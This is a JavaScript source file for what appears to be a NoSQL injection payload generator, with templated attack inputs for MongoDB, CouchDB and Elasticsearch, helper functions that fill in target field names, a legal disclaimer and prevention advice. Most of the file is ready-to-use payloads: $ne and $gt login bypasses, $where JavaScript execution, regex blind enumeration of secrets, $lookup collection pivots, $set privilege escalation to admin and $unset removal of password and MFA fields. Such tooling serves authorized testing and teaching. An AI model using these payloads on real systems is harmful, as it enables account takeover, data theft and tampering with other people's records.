export const NOSQL_INJECTION_CATEGORIES = {
  AUTH_BYPASS: 'Authentication Bypass',
  OPERATOR_INJECTION: 'Operator Injection',
  REGEX_ENUMERATION: 'Regex & Blind Enumeration',
  JAVASCRIPT_EXECUTION: 'JavaScript Execution',
  AGGREGATION_ABUSE: 'Aggregation & Query Abuse',
  UPDATE_OPERATOR_ABUSE: 'Update Operator Abuse'
}

export const BACKEND_INFO = {
  MongoDB: {
    queryStyle: 'JSON query objects and operator-based filters',
    riskyOperators: '$ne, $gt, $regex, $or, $where, $expr, $lookup',
    commonTargets: 'login APIs, search filters, JSON body parsers, admin panels',
    notes: 'MongoDB is the most common real-world NoSQL injection target because user input is often merged directly into query objects.'
  },
  CouchDB: {
    queryStyle: 'Selector documents, map/reduce queries, and Mango searches',
    riskyOperators: '$gt, $ne, $regex, selector expansion, design document misuse',
    commonTargets: 'search endpoints, sync APIs, filtered replication, admin UIs',
    notes: 'Selector manipulation and loose document filters are more common than classic auth-style injection.'
  },
  Elasticsearch: {
    queryStyle: 'JSON DSL, query_string filters, wildcard and bool queries',
    riskyOperators: 'query_string, wildcard, regexp, bool.should, script contexts',
    commonTargets: 'search bars, analytics panels, exposed internal query APIs',
    notes: 'Elasticsearch issues often show up as query expansion, hidden index access, or expensive wildcard/regex requests.'
  },
  Generic: {
    queryStyle: 'Framework-dependent JSON or object-based filtering',
    riskyOperators: 'comparison, regex, logical operators, unsafe object merge',
    commonTargets: 'REST search endpoints, GraphQL resolvers, admin filters, exports',
    notes: 'Generic object injection often happens when code trusts a user-supplied JSON filter without allowlisting keys.'
  }
}

const payloads = {
  AUTH_BYPASS: [
    {
      name: 'MongoDB $ne auth bypass',
      description: 'Replace exact-match login checks with not-null operators',
      targets: ['MongoDB', 'Generic'],
      template: `{
  "{USER_FIELD}": { "$ne": null },
  "{PASS_FIELD}": { "$ne": null }
}`,
      explanation: 'If backend code blindly passes the request body to a Mongo query, this can match any document where the chosen fields are present.'
    },
    {
      name: 'MongoDB $gt empty-string bypass',
      description: 'Use comparison operators to broaden login criteria',
      targets: ['MongoDB', 'Generic'],
      template: `{
  "{USER_FIELD}": { "$gt": "" },
  "{PASS_FIELD}": { "$gt": "" }
}`,
      explanation: 'A loose comparison against an empty string can match the first valid user document if the application treats the entire object as a trusted filter.'
    },
    {
      name: 'MongoDB $or admin shortcut',
      description: 'Broaden auth logic with OR conditions',
      targets: ['MongoDB', 'Generic'],
      template: `{
  "$or": [
    { "{USER_FIELD}": "{VALUE}" },
    { "isAdmin": true }
  ]
}`,
      explanation: 'Useful when applications allow nested JSON objects and do not constrain logical operators in authentication or account lookup flows.'
    },
    {
      name: 'CouchDB selector broad-match',
      description: 'Expand a selector so it accepts almost any document',
      targets: ['CouchDB', 'Generic'],
      template: `{
  "selector": {
    "{USER_FIELD}": { "$gt": null },
    "{PASS_FIELD}": { "$gt": null }
  }
}`,
      explanation: 'CouchDB Mango selectors can be widened if user-controlled values are embedded without allowlisting permitted fields and operators.'
    }
  ],
  OPERATOR_INJECTION: [
    {
      name: 'MongoDB comparison injection',
      description: 'Replace a scalar value with a comparison object',
      targets: ['MongoDB', 'Generic'],
      template: `{
  "{FILTER_FIELD}": {
    "$gte": "{VALUE}"
  }
}`,
      explanation: 'This changes the meaning of a simple equality check into a comparison query, often bypassing assumptions in controllers or resolvers.'
    },
    {
      name: 'MongoDB nested operator smuggling',
      description: 'Hide operators inside structured JSON input',
      targets: ['MongoDB', 'Generic'],
      template: `{
  "profile": {
    "{FILTER_FIELD}": {
      "$ne": null
    }
  }
}`,
      explanation: 'Some applications validate top-level keys but still merge nested objects into trusted filter documents.'
    },
    {
      name: 'Generic object-merge injection',
      description: 'Inject a logical operator into a filter object',
      targets: ['Generic', 'MongoDB'],
      template: `{
  "$or": [
    { "{FILTER_FIELD}": "{VALUE}" },
    { "{FILTER_FIELD}": { "$exists": true } }
  ]
}`,
      explanation: 'Useful for testing controllers that accept raw JSON filters and merge them with server-defined query objects.'
    },
    {
      name: 'CouchDB selector operator injection',
      description: 'Swap exact filtering for a permissive selector',
      targets: ['CouchDB', 'Generic'],
      template: `{
  "selector": {
    "{FILTER_FIELD}": {
      "$ne": null
    }
  }
}`,
      explanation: 'Tests whether a supposedly fixed selector can be widened through user-controlled operator objects.'
    }
  ],
  REGEX_ENUMERATION: [
    {
      name: 'MongoDB prefix enumeration',
      description: 'Use regex to test value prefixes one character at a time',
      targets: ['MongoDB', 'Generic'],
      template: `{
  "{FILTER_FIELD}": {
    "$regex": "^{REGEX_PREFIX}.*"
  }
}`,
      explanation: 'A classic blind-enumeration trick for secrets, usernames, or tokens when responses change on partial matches.'
    },
    {
      name: 'MongoDB case-insensitive probe',
      description: 'Probe with regex flags for looser matching',
      targets: ['MongoDB', 'Generic'],
      template: `{
  "{FILTER_FIELD}": {
    "$regex": "^{REGEX_PREFIX}.*",
    "$options": "i"
  }
}`,
      explanation: 'Shows whether case-insensitive regular expressions are allowed in the underlying query path.'
    },
    {
      name: 'Elasticsearch wildcard broad search',
      description: 'Expand search scope with permissive wildcard matching',
      targets: ['Elasticsearch'],
      template: `{
  "query": {
    "wildcard": {
      "{FILTER_FIELD}": "{REGEX_PREFIX}*"
    }
  }
}`,
      explanation: 'Useful when user input is dropped directly into a JSON DSL query and wildcards are not restricted.'
    },
    {
      name: 'Elasticsearch query_string expansion',
      description: 'Inject a query_string expression with logical operators',
      targets: ['Elasticsearch'],
      template: `{
  "query": {
    "query_string": {
      "query": "{FILTER_FIELD}:{REGEX_PREFIX}* OR *"
    }
  }
}`,
      explanation: 'query_string often behaves more like a parser than a plain value field, which makes it a common abuse point.'
    }
  ],
  JAVASCRIPT_EXECUTION: [
    {
      name: 'MongoDB $where boolean probe',
      description: 'Inject a JavaScript condition into a $where clause',
      targets: ['MongoDB'],
      template: `{
  "$where": "this.{USER_FIELD} === '{VALUE}' && this.{PASS_FIELD}.length > 0"
}`,
      explanation: 'When server-side JavaScript execution is enabled, $where can turn user input into executable logic.'
    },
    {
      name: 'MongoDB $where auth bypass',
      description: 'Return true for every document with a permissive script',
      targets: ['MongoDB'],
      template: `{
  "$where": "return true"
}`,
      explanation: 'A minimal test to see whether the backend allows direct $where injection. Even detection-level use should stay within authorized labs.'
    },
    {
      name: 'MongoDB timing-oriented $where',
      description: 'Trigger expensive processing to confirm execution paths',
      targets: ['MongoDB'],
      template: `{
  "$where": "function(){ for (let i = 0; i < {ITERATIONS}; i++) {} return this.{USER_FIELD} === '{VALUE}'; }"
}`,
      explanation: 'Expensive loops can create measurable timing differences when $where input is executed server-side.'
    }
  ],
  AGGREGATION_ABUSE: [
    {
      name: 'MongoDB $lookup data join',
      description: 'Join in related collections to expose extra data',
      targets: ['MongoDB'],
      template: `[
  {
    "$lookup": {
      "from": "{COLLECTION}",
      "localField": "{FILTER_FIELD}",
      "foreignField": "{FILTER_FIELD}",
      "as": "joined_docs"
    }
  }
]`,
      explanation: 'If clients can control aggregation stages, $lookup can pivot into related collections and expose unexpected data.'
    },
    {
      name: 'MongoDB $unionWith collection pivot',
      description: 'Union results from another collection',
      targets: ['MongoDB'],
      template: `[
  {
    "$unionWith": "{COLLECTION}"
  }
]`,
      explanation: 'Useful for testing whether user-supplied aggregation pipelines can pivot into unrelated collections.'
    },
    {
      name: 'Elasticsearch bool inflation',
      description: 'Broaden a query with permissive should clauses',
      targets: ['Elasticsearch'],
      template: `{
  "query": {
    "bool": {
      "should": [
        { "match_all": {} },
        { "term": { "{FILTER_FIELD}": "{VALUE}" } }
      ],
      "minimum_should_match": 1
    }
  }
}`,
      explanation: 'Combining match_all with user-controlled bool queries can effectively neutralize intended search restrictions.'
    },
    {
      name: 'CouchDB permissive selector pagination',
      description: 'Pair broad selectors with large result windows',
      targets: ['CouchDB', 'Generic'],
      template: `{
  "selector": {
    "{FILTER_FIELD}": { "$gte": null }
  },
  "limit": 1000
}`,
      explanation: 'Broad selectors plus oversized limits can reveal whether the API enforces server-side result caps.'
    }
  ],
  UPDATE_OPERATOR_ABUSE: [
    {
      name: 'MongoDB privilege escalation via $set',
      description: 'Inject an update operator into a profile or admin path',
      targets: ['MongoDB', 'Generic'],
      template: `{
  "$set": {
    "role": "admin",
    "isAdmin": true
  }
}`,
      explanation: 'If an endpoint expects plain fields but accepts raw update operators, this can become direct privilege escalation.'
    },
    {
      name: 'MongoDB destructive $unset',
      description: 'Remove fields instead of updating them',
      targets: ['MongoDB', 'Generic'],
      template: `{
  "$unset": {
    "{PASS_FIELD}": "",
    "mfaSecret": ""
  }
}`,
      explanation: 'A useful test when applications forward client JSON directly into updateOne or findOneAndUpdate calls.'
    },
    {
      name: 'MongoDB numeric abuse with $inc',
      description: 'Manipulate counters and balances through operator injection',
      targets: ['MongoDB', 'Generic'],
      template: `{
  "$inc": {
    "credits": 1000,
    "loginCount": -10
  }
}`,
      explanation: 'Shows whether client input is treated as a safe patch object or a raw update document with operators.'
    },
    {
      name: 'MongoDB field rename pivot',
      description: 'Rename a benign field into a privileged one',
      targets: ['MongoDB'],
      template: `{
  "$rename": {
    "{FILTER_FIELD}": "isAdmin"
  }
}`,
      explanation: 'Rare but high impact in poorly constrained update endpoints that allow arbitrary operators.'
    }
  ]
}

export const COMMON_ATTACK_SURFACES = [
  {
    name: 'JSON login endpoints',
    example: 'POST /api/login with a JSON body merged directly into a Mongo or Couch query'
  },
  {
    name: 'Search and filter APIs',
    example: 'REST or GraphQL search endpoints that accept raw filter objects from the client'
  },
  {
    name: 'Admin dashboards',
    example: 'Internal tools that expose flexible selectors, exports, or analytics filters'
  },
  {
    name: 'Profile update routes',
    example: 'Endpoints that pass user JSON directly into updateOne or findOneAndUpdate calls'
  }
]

export const LEGAL_DISCLAIMER = `This tool is for AUTHORIZED security testing and educational use only.

Only use these payloads on systems you own or are explicitly permitted to assess.
NoSQL injection can expose credentials, broaden queries, manipulate records, or trigger server-side code paths.
Unauthorized use is illegal and can cause real harm.`

export const PREVENTION_GUIDANCE = [
  'Allowlist accepted fields and reject operator-style keys such as $ne, $or, $where, and $regex from untrusted input.',
  'Never pass client JSON directly into query, aggregate, or update functions.',
  'Separate trusted server-built filters from user-controlled values and coerce types explicitly.',
  'Disable or tightly restrict dangerous features such as MongoDB server-side JavaScript and unrestricted query_string search.',
  'Cap result sizes, query complexity, regex usage, and expensive aggregation stages.',
  'Log rejected operators and unusual nested filter objects for review.'
]

export const TESTING_WORKFLOW = [
  'Start with low-impact detection probes like $ne or prefix regex checks before trying riskier operators.',
  'Compare behavior between scalar input and structured JSON object input.',
  'Look for differences in result count, response shape, auth outcome, or timing.',
  'Document the exact endpoint, accepted content type, and request serializer involved.',
  'Recommend server-side field allowlisting and safe query construction in the final report.'
]

export const getAllCategories = () => Object.entries(NOSQL_INJECTION_CATEGORIES).map(([key, label]) => ({
  key,
  label
}))

const matchesTarget = (payload, backend) => backend === 'All' || payload.targets.includes(backend)

export const getPayloadsByCategory = (categoryKey, backend = 'All') => {
  const categoryPayloads = payloads[categoryKey] ?? []
  return categoryPayloads.filter((payload) => matchesTarget(payload, backend))
}

export const getAllPayloads = (backend = 'All') => (
  Object.values(payloads).flat().filter((payload) => matchesTarget(payload, backend))
)

export const searchPayloads = (query, backend = 'All') => {
  const normalizedQuery = query.toLowerCase()

  return getAllPayloads(backend).filter((payload) => (
    payload.name.toLowerCase().includes(normalizedQuery) ||
    payload.description.toLowerCase().includes(normalizedQuery) ||
    payload.explanation.toLowerCase().includes(normalizedQuery) ||
    payload.template.toLowerCase().includes(normalizedQuery)
  ))
}

export const fillPayloadTemplate = (template, replacements) => (
  template.replace(/\{(USER_FIELD|PASS_FIELD|FILTER_FIELD|VALUE|COLLECTION|REGEX_PREFIX|ITERATIONS)\}/g, (_, key) => replacements[key])
)
